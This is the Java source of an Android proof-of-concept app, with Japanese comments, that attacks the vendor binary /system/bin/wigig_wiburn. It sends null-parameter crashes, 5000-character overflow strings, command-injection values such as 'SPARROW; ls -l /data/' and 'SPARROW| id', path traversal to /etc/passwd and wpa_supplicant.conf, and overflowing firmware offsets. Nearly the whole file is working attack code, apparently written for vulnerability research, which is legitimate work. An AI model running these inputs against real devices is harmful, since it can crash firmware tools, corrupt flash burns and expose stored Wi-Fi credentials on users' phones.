package com.wigig.poc;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

    private TextView tvOutput;
    private final StringBuilder log = new StringBuilder();

    // JNIは補助的に使用（今回はバイナリ実行のトリガーが主目的）
    static {
        System.loadLibrary("wigig_poc");
    }
    public native String runCommand(String cmd);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvOutput = findViewById(R.id.tv_output);

        findViewById(R.id.btn_null_test).setOnClickListener(v -> testNullPointer());
        findViewById(R.id.btn_overflow).setOnClickListener(v -> testBufferOverflow());
        findViewById(R.id.btn_injection).setOnClickListener(v -> testCommandInjection());
        findViewById(R.id.btn_path_traversal).setOnClickListener(v -> testPathTraversal());
        findViewById(R.id.btn_int_overflow).setOnClickListener(v -> testIntOverflow());
    }

    private void append(String s) {
        log.append(s).append("\n");
        tvOutput.setText(log.toString());
    }

    // 1. NULLポインタ参照（-burnのみ指定で必須パラメータ欠落）
    private void testNullPointer() {
        append("=== 1. NULLポインタ参照 (DoS) ===");
        // ログのクラッシュを再現: -burn のみ
        exec("/system/bin/wigig_wiburn", "-burn");
        // -device のみ指定（-burn なし）
        exec("/system/bin/wigig_wiburn", "-device", "SPARROW");
        // 空の -fw
        exec("/system/bin/wigig_wiburn", "-burn", "-fw", "");
    }

    // 2. バッファオーバーフロー（長大文字列）
    private void testBufferOverflow() {
        append("=== 2. バッファオーバーフロー (5000文字) ===");
        String longStr = new String(new char[5000]).replace('\0', 'A');
        // -device に長大文字列を渡す (ログのクラッシュを再現)
        exec("/system/bin/wigig_wiburn", "-device", longStr, "-burn");
        // -interface にも
        exec("/system/bin/wigig_wiburn", "-interface", longStr, "-device", "SPARROW");
        // -fw にも
        exec("/system/bin/wigig_wiburn", "-fw", longStr, "-device", "SPARROW");
    }

    // 3. コマンドインジェクション（シェルメタ文字）
    private void testCommandInjection() {
        append("=== 3. コマンドインジェクション ===");
        // セミコロンで ls を実行
        exec("/system/bin/wigig_wiburn", "-device", "SPARROW; ls -l /data/", "-burn");
        // パイプで id
        exec("/system/bin/wigig_wiburn", "-device", "SPARROW| id", "-burn");
        // バッククォート
        exec("/system/bin/wigig_wiburn", "-device", "SPARROW`ls`", "-burn");
        // 改行コード
        exec("/system/bin/wigig_wiburn", "-device", "SPARROW\nid", "-burn");
    }

    // 4. パストラバーサル
    private void testPathTraversal() {
        append("=== 4. パストラバーサル ===");
        // システムファイルを指定
        exec("/system/bin/wigig_wiburn", "-fw", "../../../system/etc/hosts", "-device", "SPARROW");
        exec("/system/bin/wigig_wiburn", "-ids", "../../../data/misc/wifi/wpa_supplicant.conf", "-device", "SPARROW");
        // 絶対パスで/etc/passwd
        exec("/system/bin/wigig_wiburn", "-setup_ini", "/data/local/tmp/../../../../etc/passwd", "-device", "SPARROW");
    }

    // 5. 整数オーバーフロー
    private void testIntOverflow() {
        append("=== 5. 整数オーバーフロー ===");
        // 最大値を超える値
        exec("/system/bin/wigig_wiburn", "-read", "-offset", "0xFFFFFFFFFFFFFFFF", "-length", "0x80000000", "-device", "SPARROW");
        // 負の値（strtoull は符号なし変換のため、意図しない大きな値になる）
        exec("/system/bin/wigig_wiburn", "-burn", "-offset", "-1", "-length", "1", "-device", "SPARROW");
    }

    // コマンド実行ユーティリティ
    private void exec(String... cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                append("[stdout] " + line);
            }
            int code = p.waitFor();
            append("終了コード: " + code);
        } catch (IOException | InterruptedException e) {
            append("実行例外: " + e.getMessage());
        }
    }
}
